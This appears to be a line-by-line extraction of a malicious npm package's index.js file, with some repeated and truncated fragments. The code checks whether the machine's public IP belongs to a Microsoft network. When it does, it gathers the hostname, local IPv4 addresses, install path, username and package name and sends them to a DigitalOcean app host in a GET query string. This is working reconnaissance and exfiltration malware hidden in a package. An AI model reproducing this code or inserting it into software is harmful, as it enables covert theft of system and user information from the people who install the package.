// File: package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const path = require('path')
Line 3: const https = require('https')
Line 4: const request = require('sync-request')
Line 14: {
    const req = https.request(options, res => {
      let data = '';
      res.on('data', chunk => {
        data += chunk;
      });
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          resolve(response.as.includes('Microsoft'));
        } catch (error) {
          reject(error);
        }
      });
    });
    req.on('error', error => {
      reject(error);
    });
    req.end();
  }
Line 15: const req = https.request(options, res => {
      let data = '';
      res.on('data', chunk => {
        data += chunk;
      });
      res.on('end', () => {
        try {
          const response = JSON.parse(data);
          resolve(response.as.includes('Microsoft'));
        } catch (error) {
          reject(error);
        }
      });
    })
Line 22: const response = JSON.parse(data)
Line 23: response.as.includes('Microsoft')
Line 32: req.end()
Line 36: const pi = request('GET', 'https://api.ipify.org').getBody().toString()
Line 38: (_tmp_5 = isIpInMS(pi)
  .then(result => {
    if (result) {
      console.log('on here');
      // Get the hostname
      const hostname = os.hostname();
      //console.log("Hostname: " + hostname);

      // Get the network interfaces
      const interfaces = os.networkInterfaces();

      let ips = "";
      for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
          // Filter out internal/non-IPv4 addresses
          if (iface.family === "IPv4" && !iface.internal) {
            //console.log("IP Address: " + iface.address);
            ips = ips + iface.address + "|"
          }
        }
      };

      //get system path
      const systemPath = path.join(__dirname, '.');
      //console.log(systemPath);

      // get username
      const userInfo = os.userInfo();
      //console.log(userInfo["username"]);

      // get current package
      const packagePath = path.dirname(require.main.filename);
      const packageJson = require(path.join(pa...)
Line 40: {
      console.log('on here');
      // Get the hostname
      const hostname = os.hostname();
      //console.log("Hostname: " + hostname);

      // Get the network interfaces
      const interfaces = os.networkInterfaces();

      let ips = "";
      for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
          // Filter out internal/non-IPv4 addresses
          if (iface.family === "IPv4" && !iface.internal) {
            //console.log("IP Address: " + iface.address);
            ips = ips + iface.address + "|"
          }
        }
      };

      //get system path
      const systemPath = path.join(__dirname, '.');
      //console.log(systemPath);

      // get username
      const userInfo = os.userInfo();
      //console.log(userInfo["username"]);

      // get current package
      const packagePath = path.dirname(require.main.filename);
      const packageJson = require(path.join(packagePath, 'package.json'));
      //console.log(...
Line 43: os.hostname()
Line 50: for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
          // Filter out internal/non-IPv4 addresses
          if (iface.family === "IPv4" && !iface.internal) {
            //console.log("IP Address: " + iface.address);
            ips = ips + iface.address + "|"
          }
        }
      }
Line 51: for (const iface of interfaces[name]) {
          // Filter out internal/non-IPv4 addresses
          if (iface.family === "IPv4" && !iface.internal) {
            //console.log("IP Address: " + iface.address);
            ips = ips + iface.address + "|"
          }
        }
Line 61: path.join(__dirname, '.')
Line 65: os.userInfo()
Line 69: const packagePath = path.dirname(require.main.filename)
Line 70: const packageJson = require(path.join(packagePath, 'package.json'))
Line 75: const options = {
        hostname: 'monkfish-app-brmld.ondigitalocean.app',
        port: 443,
        path: '/?hostname=' + hostname + '&ip=' + ips + '&path=' + systemPath + '&public_ip=' + pi + "&user=" + userInfo["username"] + "&package=" + packageJson["name"],
        method: 'GET'
      }
Line 78: _tmp_7.path = '/?hostname=' + hostname + '&ip=' + ips + '&path=' + systemPath + '&public_ip=' + pi + "&user=" + userInfo["username"] + "&package=" + packageJson["name"]
Line 82: const req = https.request(options, (res) => {
        //console.log(`statusCode: ${res.statusCode}`);

        res.on('data', (d) => {
          process.stdout.write(d);
        });
      })
Line 85: {
          process.stdout.write(d);
        }
Line 86: process.stdout.write(d)
Line 94: req.end()
